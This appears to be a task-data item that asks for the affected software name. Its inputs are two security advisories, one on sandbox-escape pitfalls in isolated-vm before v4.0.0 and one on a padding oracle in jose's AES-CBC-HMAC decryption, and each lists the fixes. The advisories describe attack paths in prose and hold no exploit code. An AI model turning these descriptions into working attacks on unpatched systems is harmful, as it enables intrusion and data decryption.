Please identify the software name affected by it. Input: Versions of `isolated-vm` before v4.0.0, and especially before v3.0.0, have API pitfalls which may make it easy for implementers to expose supposed secure isolates to the permissions of the main nodejs isolate.\n\n`Reference` objects allow access to the underlying reference's full prototype chain. In an environment where the implementer has exposed a `Reference` instance to an attacker they would be able to use it to acquire a `Reference` to the nodejs context's `Function` object.\n\nSimilar application-specific attacks could be possible by modifying the local prototype of other API objects.\n\nAccess to `NativeModule` objects could allow an attacker to load and run native code from anywhere on the filesystem. If combined with, for example, a file upload API this would allow for arbitrary code execution.\n\nTo address these issues the following changes were made in v4.0.0:\n- Documentation was updated with more explicit guidelines on building secure applications.\n- `Reference` instances will no longer follow prototype chains by default, nor will they invoke accessors or proxies.\n- All `isolated-vm` API prototypes are now immutable.\n- `NativeModule` constructor may only be invoked from a nodejs isolate..

Input: jose is an npm library providing a number of cryptographic operations.\n### Impact\n\n[AES_CBC_HMAC_SHA2 Algorithm](https://tools.ietf.org/html/rfc7518#section-5.2) (A128CBC-HS256, A192CBC-HS384, A256CBC-HS512) decryption would always execute both HMAC tag verification and CBC decryption, if either failed `JWEDecryptionFailed` would be thrown. But a possibly observable difference in timing when padding error would occur while decrypting the ciphertext makes a padding oracle and an adversary might be able to make use of that oracle to decrypt data without knowing the decryption key by issuing on average 128*b calls to the padding oracle (where b is the number of bytes in the ciphertext block).\n\n### Patches\n\nAll major release versions have had a patch released which ensures the HMAC tag is verified before performing CBC decryption. The fixed versions are `^1.28.1 || ^2.0.5 || >=3.11.4`.\n\nUsers should upgrade their v1.x dependency to [`^1.28.1`](https://github.com/panva/jose/releases/tag/v1.28.1), their v2.x dependency to [`^2.0.5`](https://github.com/panva/jose/releases/tag/v2.0.5), and their v3.x dependency to [`^3.11.4`](https://github.com/panva/jose/releases/tag/v3.11.4)\n\n### Credits\nThanks to Morgan Brown of Microsoft for bringing this up and Eva Sarafianou (@esarafianou) for helping to score this advisory..
